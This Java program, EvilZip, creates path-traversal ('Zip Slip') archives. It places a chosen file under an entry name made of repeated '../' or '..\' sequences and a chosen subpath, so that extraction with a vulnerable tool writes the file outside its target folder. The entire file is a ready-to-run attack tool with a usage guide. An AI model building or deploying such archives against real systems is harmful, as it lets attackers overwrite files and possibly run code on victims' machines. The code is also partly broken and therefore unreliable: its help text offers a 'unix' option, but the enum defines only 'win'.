

import java.io.*;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class EvilZip {
    private static final java.lang.String PARAM_OUTPUT_FILE = "--output-file=";
    private static final java.lang.String PARAM_DEPTH = "--depth=";
    private static final java.lang.String PARAM_OS = "--os=";
    private static final java.lang.String PARAM_PATH = "--path=";
    // 4MB buffer
    private static final byte[] BUFFER = new byte[4096 * 1024];


    public static void main(String[] args) {
        if (args == null || args.length == 0) {
            printHelp();
            return;
        }
        String out = "evil.zip";
        int depths = 2;
        OS os = OS.win;
        String path = "";
        String sourceFile = null;

        for (String param: args) {
            if (param.startsWith(PARAM_OUTPUT_FILE)) {
                out = param.substring(PARAM_OUTPUT_FILE.length());
            } else if (param.startsWith(PARAM_DEPTH)) {
                depths = Integer.parseInt(param.substring(PARAM_DEPTH.length()));
            } else if (param.startsWith(PARAM_OS)) {
                os = OS.valueOf(param.substring(PARAM_OS.length()));
            } else if (param.startsWith(PARAM_PATH)) {
                path = param.substring(PARAM_PATH.length());
            } else {
                sourceFile = param;
            }
        }

        if (sourceFile == null) {
            printHelp();
            return;
        }

        File file = new File(sourceFile);
        if (!file.exists() || !file.isFile() ) {
            System.err.println(file + " - is not a file");
            printHelp();
            return;
        }

        String traversal = (os == OS.win ? "..\\" : "../").repeat(Math.max(0, depths)) + path;

        try (ZipOutputStream zipFile = new ZipOutputStream(new FileOutputStream(out))) {
            ZipEntry e = new ZipEntry(traversal + sourceFile);
            zipFile.putNextEntry(e);
            copy(new FileInputStream(file), zipFile);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void printHelp() {
        System.out.println("Create archive containing a file with directory traversal\n" +
                "usage: java EvilZip <input file> [--output-file=evil.zip] [--depth=2] [--os=win] [--path=]\n" +
                "   <input file> - zip file to make traversal\n" +
                "   --output-file - output filename\n" +
                "   --depth - count of traversals\n" +
                "   --os - type of slashes to make traversal: win or unix\n" +
                "   --path - subpath to include in path after traversal");
    }

    private static void copy(InputStream input, OutputStream output) throws IOException {
        int bytesRead;
        while ((bytesRead = input.read(BUFFER))!= -1) {
            output.write(BUFFER, 0, bytesRead);
        }
    }

    private enum OS {
        win
    }
}